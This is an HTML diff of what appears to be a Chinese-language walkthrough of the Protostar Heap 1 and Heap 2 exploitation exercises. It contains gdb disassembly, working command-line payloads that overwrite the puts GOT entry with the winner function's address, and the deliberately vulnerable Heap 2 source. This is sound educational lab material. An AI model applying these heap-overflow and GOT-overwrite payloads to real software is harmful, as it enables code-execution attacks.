+0x080484fd<span class="w"> </span>&lt;main+68&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>,eax
+0x08048501<span class="w"> </span>&lt;main+72&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>
+0x08048505<span class="w"> </span>&lt;main+76&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>,0x2
+0x0804850b<span class="w"> </span>&lt;main+82&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8
+0x08048512<span class="w"> </span>&lt;main+89&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483bc<span class="w"> </span>&lt;malloc@plt&gt;
+0x08048517<span class="w"> </span>&lt;main+94&gt;:<span class="w">   </span>mov<span class="w">    </span>edx,eax
+0x08048519<span class="w"> </span>&lt;main+96&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>
+0x0804851d<span class="w"> </span>&lt;main+100&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax+0x4<span class="o">]</span>,edx
+0x08048520<span class="w"> </span>&lt;main+103&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x08048523<span class="w"> </span>&lt;main+106&gt;:<span class="w">  </span>add<span class="w">    </span>eax,0x4
+0x08048526<span class="w"> </span>&lt;main+109&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>
+0x08048528<span class="w"> </span>&lt;main+111&gt;:<span class="w">  </span>mov<span class="w">    </span>edx,eax
+0x0804852a<span class="w"> </span>&lt;main+113&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>
+0x0804852e<span class="w"> </span>&lt;main+117&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax+0x4<span class="o">]</span>
+0x08048531<span class="w"> </span>&lt;main+120&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x08048535<span class="w"> </span>&lt;main+124&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048538<span class="w"> </span>&lt;main+127&gt;:<span class="w">  </span>call<span class="w">   </span>0x804838c<span class="w"> </span>&lt;strcpy@plt&gt;
+0x0804853d<span class="w"> </span>&lt;main+132&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x08048540<span class="w"> </span>&lt;main+135&gt;:<span class="w">  </span>add<span class="w">    </span>eax,0x8
+0x08048543<span class="w"> </span>&lt;main+138&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>
+0x08048545<span class="w"> </span>&lt;main+140&gt;:<span class="w">  </span>mov<span class="w">    </span>edx,eax
+0x08048547<span class="w"> </span>&lt;main+142&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>
+0x0804854b<span class="w"> </span>&lt;main+146&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax+0x4<span class="o">]</span>
+0x0804854e<span class="w"> </span>&lt;main+149&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x08048552<span class="w"> </span>&lt;main+153&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048555<span class="w"> </span>&lt;main+156&gt;:<span class="w">  </span>call<span class="w">   </span>0x804838c<span class="w"> </span>&lt;strcpy@plt&gt;
+0x0804855a<span class="w"> </span>&lt;main+161&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x804864b
+0x08048561<span class="w"> </span>&lt;main+168&gt;:<span class="w">  </span>call<span class="w">   </span>0x80483cc<span class="w"> </span>&lt;puts@plt&gt;<span class="w"> </span><span class="c1"># 由于编译优化，实际上调用的是 puts</span>
+0x08048566<span class="w"> </span>&lt;main+173&gt;:<span class="w">  </span>leave<span class="w">  </span>
+0x08048567<span class="w"> </span>&lt;main+174&gt;:<span class="w">  </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>0x80483cc
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>puts@plt:
+0x080483cc<span class="w"> </span>&lt;puts@plt+0&gt;:<span class="w">    </span>jmp<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span>ds:0x8049774
+0x080483d2<span class="w"> </span>&lt;puts@plt+6&gt;:<span class="w">    </span>push<span class="w">   </span>0x30
+0x080483d7<span class="w"> </span>&lt;puts@plt+11&gt;:<span class="w">   </span>jmp<span class="w">    </span>0x804835c
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>0x8049774
+0x8049774<span class="w"> </span>&lt;_GLOBAL_OFFSET_TABLE_+36&gt;:<span class="w">   </span>0x080483d2
 </code></pre></div>
 </li>
 <li>
 <p><code>winner</code> 函数的地址</p>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x winner 
-0x8048494 &lt;winner&gt;: 0x83e58955
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>winner<span class="w"> </span>
+0x8048494<span class="w"> </span>&lt;winner&gt;:<span class="w"> </span>0x83e58955
 </code></pre></div>
 </li>
 </ul>
 <h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ ./heap1 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;A&#39; * 20 + &#39;\x74\x97\x04\x08&#39;&quot;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;\x94\x84\x04\x08&#39;&quot;</span><span class="sb">`</span>
-and we have a winner @ <span class="m">1662252909</span>
-$ ./heap1 <span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
-and we have a winner @ <span class="m">1662253600</span>
-$ ./heap1 <span class="s2">&quot;`/bin/echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`/bin/echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
-and we have a winner @ <span class="m">1662256772</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./heap1<span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;A&#39; * 20 + &#39;\x74\x97\x04\x08&#39;&quot;</span><span class="sb">`</span><span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x94\x84\x04\x08&#39;&quot;</span><span class="sb">`</span>
+and<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>winner<span class="w"> </span>@<span class="w"> </span><span class="m">1662252909</span>
+$<span class="w"> </span>./heap1<span class="w"> </span><span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span><span class="w"> </span><span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+and<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>winner<span class="w"> </span>@<span class="w"> </span><span class="m">1662253600</span>
+$<span class="w"> </span>./heap1<span class="w"> </span><span class="s2">&quot;`/bin/echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span><span class="w"> </span><span class="s2">&quot;`/bin/echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+and<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>winner<span class="w"> </span>@<span class="w"> </span><span class="m">1662256772</span>
 <span class="c1"># 在 gdb 中需要使用 /bin/echo，使用 echo 将不解析参数 -ne 而是直接输出</span>
 </code></pre></div>
 <h3 id="additional">Additional<a class="headerlink" href="#additional" title="Permanent link">&para;</a></h3>
 <p>关于在 <code>gdb</code> 中使用 <code>echo</code> 不能成功的问题</p>
-<div class="highlight"><pre><span></span><code>$ gdb ./heap1
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484ce
-Breakpoint <span class="m">1</span> at 0x80484ce: file heap1/heap1.c, line <span class="m">23</span>.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804853d
-Breakpoint <span class="m">2</span> at 0x804853d: file heap1/heap1.c, line <span class="m">32</span>.
-<span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
-Starting program: /opt/protostar/bin/heap1 <span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span> <span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./heap1
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x080484ce
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x80484ce:<span class="w"> </span>file<span class="w"> </span>heap1/heap1.c,<span class="w"> </span>line<span class="w"> </span><span class="m">23</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x0804853d
+Breakpoint<span class="w"> </span><span class="m">2</span><span class="w"> </span>at<span class="w"> </span>0x804853d:<span class="w"> </span>file<span class="w"> </span>heap1/heap1.c,<span class="w"> </span>line<span class="w"> </span><span class="m">32</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span><span class="w"> </span><span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/heap1<span class="w"> </span><span class="s2">&quot;`echo -ne &quot;</span>AAAABBBBCCCCDDDDEEEE<span class="se">\x</span><span class="m">74</span><span class="se">\x</span><span class="m">97</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span><span class="w"> </span><span class="s2">&quot;`echo -ne &quot;</span><span class="se">\x</span><span class="m">94</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">08</span><span class="s2">&quot;`&quot;</span>
 
-Breakpoint <span class="m">1</span>, 0x080484ce <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">3</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff714<span class="o">)</span> at heap1/heap1.c:23
-<span class="m">23</span>  <span class="k">in</span> heap1/heap1.c
-<span class="o">(</span>gdb<span class="o">)</span> info registers 
-eax            0x804a008    <span class="m">134520840</span>
-ecx            0xb7fd93a0   -1208118368
-edx            0x804a000    <span class="m">134520832</span>
-ebx            0xb7fd7ff4   -1208123404
-esp            0xbffff640   0xbffff640
-ebp            0xbffff668   0xbffff668
-esi            0x0  <span class="m">0</span>
-edi            0x0  <span class="m">0</span>
-eip            0x80484ce    0x80484ce &lt;main+21&gt;
-eflags         0x200246 <span class="o">[</span> PF ZF IF ID <span class="o">]</span>
-cs             0x73 <span class="m">115</span>
-ss             0x7b <span class="m">123</span>
-ds             0x7b <span class="m">123</span>
-es             0x7b <span class="m">123</span>
-fs             0x0  <span class="m">0</span>
-gs             0x33 <span class="m">51</span>
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$i1</span> <span class="o">=</span> <span class="o">(</span>struct internet*<span class="o">)</span>0x804a008
-<span class="o">(</span>gdb<span class="o">)</span> print *<span class="nv">$i1</span>
-<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span><span class="nv">priority</span> <span class="o">=</span> <span class="m">0</span>, <span class="nv">name</span> <span class="o">=</span> 0x0<span class="o">}</span>
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x080484ce<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">3</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff714<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap1/heap1.c:23
+<span class="m">23</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap1/heap1.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers<span class="w"> </span>
+eax<span class="w">            </span>0x804a008<span class="w">    </span><span class="m">134520840</span>
+ecx<span class="w">            </span>0xb7fd93a0<span class="w">   </span>-1208118368
+edx<span class="w">            </span>0x804a000<span class="w">    </span><span class="m">134520832</span>
+ebx<span class="w">            </span>0xb7fd7ff4<span class="w">   </span>-1208123404
+esp<span class="w">            </span>0xbffff640<span class="w">   </span>0xbffff640
+ebp<span class="w">            </span>0xbffff668<span class="w">   </span>0xbffff668
+esi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+edi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+eip<span class="w">            </span>0x80484ce<span class="w">    </span>0x80484ce<span class="w"> </span>&lt;main+21&gt;
+eflags<span class="w">         </span>0x200246<span class="w"> </span><span class="o">[</span><span class="w"> </span>PF<span class="w"> </span>ZF<span class="w"> </span>IF<span class="w"> </span>ID<span class="w"> </span><span class="o">]</span>
+cs<span class="w">             </span>0x73<span class="w"> </span><span class="m">115</span>
+ss<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+ds<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+es<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
+gs<span class="w">             </span>0x33<span class="w"> </span><span class="m">51</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">$i1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>struct<span class="w"> </span>internet*<span class="o">)</span>0x804a008
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>print<span class="w"> </span>*<span class="nv">$i1</span>
+<span class="nv">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x0<span class="o">}</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
 
-Breakpoint <span class="m">2</span>, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">3</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff714<span class="o">)</span> at heap1/heap1.c:32
-<span class="m">32</span>  <span class="k">in</span> heap1/heap1.c
-<span class="o">(</span>gdb<span class="o">)</span> print *<span class="nv">$i1</span>
-<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span><span class="nv">priority</span> <span class="o">=</span> <span class="m">1</span>, 
-  <span class="nv">name</span> <span class="o">=</span> 0x804a018 <span class="s2">&quot;-ne AAAABBBBCCCCDDDDEEEE\\x74\\x97\\x04\\x08&quot;</span><span class="o">}</span>
+Breakpoint<span class="w"> </span><span class="m">2</span>,<span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">3</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff714<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap1/heap1.c:32
+<span class="m">32</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap1/heap1.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>print<span class="w"> </span>*<span class="nv">$i1</span>
+<span class="nv">$2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span>,<span class="w"> </span>
+<span class="w">  </span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804a018<span class="w"> </span><span class="s2">&quot;-ne AAAABBBBCCCCDDDDEEEE\\x74\\x97\\x04\\x08&quot;</span><span class="o">}</span>
 </code></pre></div>
 <h2 id="heap-2">Heap 2<a class="headerlink" href="#heap-2" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 
-<span class="k">struct</span><span class="w"> </span><span class="nc">auth</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">auth</span><span class="p">;</span><span class="w"></span>
-<span class="p">};</span><span class="w"></span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">auth</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">auth</span><span class="p">;</span>
+<span class="p">};</span>
 
-<span class="k">struct</span><span class="w"> </span><span class="nc">auth</span><span class="w"> </span><span class="o">*</span><span class="n">auth</span><span class="p">;</span><span class="w"></span>
-<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">service</span><span class="p">;</span><span class="w"></span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">auth</span><span class="w"> </span><span class="o">*</span><span class="n">auth</span><span class="p">;</span>
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">service</span><span class="p">;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
 
-<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">auth</span><span class="p">,</span><span class="w"> </span><span class="n">service</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">auth</span><span class="p">,</span><span class="w"> </span><span class="n">service</span><span class="p">);</span>
 
-<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
 
-<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;auth &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;auth &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
 <span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span><span class="w">    </span><span class="c1">// new allocated area can have old data</span>
-<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">31</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span><span class="w"></span>
-<span class="w">      </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;reset&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;service&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">7</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">31</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
